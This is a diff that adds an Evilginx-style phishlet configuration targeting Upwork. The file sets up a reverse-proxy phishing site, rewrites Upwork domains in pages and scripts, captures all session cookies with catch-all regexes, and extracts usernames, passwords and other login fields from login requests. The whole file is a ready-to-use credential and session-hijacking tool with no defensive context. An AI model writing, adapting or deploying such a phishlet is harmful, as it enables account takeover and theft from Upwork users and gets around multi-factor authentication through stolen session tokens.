@@ -1,0 +1,38 @@
+author: '@hash3liZer'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'upwork.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'upwork.com', session: true, is_landing: true, auto_filter: false}
+sub_filters:
+  - {triggers_on: 'www', orig_sub: 'www', domain: 'upwork.com', search: 'www.upwork.com', replace: 'www.{domain}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+  - {triggers_on: 'www', orig_sub: 'www', domain: 'upwork.com', search: 'assets.static-upwork.com', replace: 'assets.{domain}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
+auth_tokens:
+  - domain: 'www.upwork.com'
+    keys: ['.*,regex']
+  - domain: '.upwork.com'
+    keys: ['.*,regex']
+  - domain: 'upwork.com'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: ''
+    search: '"login[username]":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"login[password]":"([^"]*)'
+    type: 'json'
+  custom:
+    - key: ''
+      search: '"login[mode]":"([^"]*)'
+      type: 'json'
+    - key: ''
+      search: '"login[iovation]":"([^"]*)'
+      type: 'json'
+auth_urls:
+  - '/signup/home'
+  - '/ab/find-work/'
+  - '/freelancers/'
+login:
+  domain: 'www.upwork.com'
+  path: '/ab/account-security/login'
